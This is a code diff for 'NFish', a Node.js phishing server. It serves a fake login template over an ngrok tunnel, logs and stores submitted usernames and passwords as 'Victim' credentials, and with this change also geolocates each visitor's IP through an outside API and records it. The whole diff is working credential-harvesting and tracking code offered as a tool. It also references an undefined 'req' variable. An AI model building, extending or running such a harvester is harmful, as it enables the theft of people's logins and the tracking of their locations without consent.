@@ -4,8 +4,10 @@ const fs = require('fs')
 const express = require('express');
 const bodyParser = require('body-parser');
 
+const iplocate = require('node-iplocate');
+const http = require('http');
+
 const connectToWorld = require('./ngrokHandler');
-const credentialFile = path.resolve(path.join(__dirname, '../output/credentials.json'))
 
 const process = require('process')
 const { Command } = require('commander');
@@ -18,12 +20,15 @@ program.name("NFish@"+version)
 program.description(description)
 
 program.option('--no-tunnel', "Don't use default NGROK service for tunneling (Default false)")
+program.option('--no-iploc', "Don't Locate the IP Addr (uses iplocate.io api with 1000-Requests/day) (Default false)")
 program.option('-p, --port <int>', 'Port number, which server will use (Default 8080).')
 program.option('-t, --template <str>', 'Fake phishing form template to use (Default template/index.html).')
 program.option('-v, --version', 'Show Program Version.')
 
 var args = program.parse(process.argv).opts()
-args.tunnel = !args.tunnel // Flip the value because it is by default true.
+// Flip the value because it is by default true.
+args.tunnel = !args.tunnel
+// args.iploc = !args.iploc
 
 if (args.help) {
 	program.help();
@@ -69,12 +74,12 @@ if (args.template) {
 	args.template = path.resolve(path.join(__dirname, "../template/index.html"))
 }
 
-async function addJSON(data={}) {
-	let jsonFile = fs.readFileSync(credentialFile, { encoding: 'utf-8' })
+async function addJSON(file, data={}) {
+	let jsonFile = fs.readFileSync(file, { encoding: 'utf-8' })
 	let jsonParsed = JSON.parse(jsonFile)
 	jsonParsed.push(data)
 	let jsonString = JSON.stringify(jsonParsed)
-	fs.writeFileSync(credentialFile, jsonString, { encoding: 'utf-8' })
+	fs.writeFileSync(file, jsonString, { encoding: 'utf-8' })
 	return jsonString
 }
 
@@ -85,18 +90,53 @@ app.use(bodyParser.json());
 
 app.get('/', function(request, response) {
 	response.sendFile(args.template);
+	const ip = request.headers['x-forwarded-for'] || req.connection.remoteAddress;
+	console.log(ip + " Connected To Server.");
+
+	if (args.iploc) {
+		iplocate(ip).then((results) => {
+			addJSON(
+				path.resolve(path.join(__dirname, '../output/ipAddr.json')),
+				results
+			)		
+		});
+	} else {
+		addJSON(
+			path.resolve(path.join(__dirname, '../output/ipAddr.json')),
+			{
+				ip: ip
+			}
+		)		
+	}
 });
 
 app.post('/validate', function(request, response) {
-	var username = request.body.username;
-	var password = request.body.password;
+	const username = request.body.username;
+	const password = request.body.password;
+	const ip = request.headers['x-forwarded-for'] || req.connection.remoteAddress;
+	console.log(ip + " is now a Victim");
 	if (username && password) {
 		console.log("USR: " + username);
 		console.log("PASWD: " + password);
-		addJSON({
-			usrname: username,
-			passwd: password
-		})
+		addJSON(
+			path.resolve(path.join(__dirname, '../output/credentials.json')),
+			{
+				usrname: username,
+				passwd: password
+			}
+		)
+
+		if (args.iploc) {
+			iplocate(ip).then((results) => {
+				addJSON(
+					path.resolve(path.join(__dirname, '../output/ipAddr.json')),
+					{
+						ip: ip
+					}
+				)		
+			});
+		}
+	
 		response.redirect('/?valid=true')
 		response.end();
 	} else {
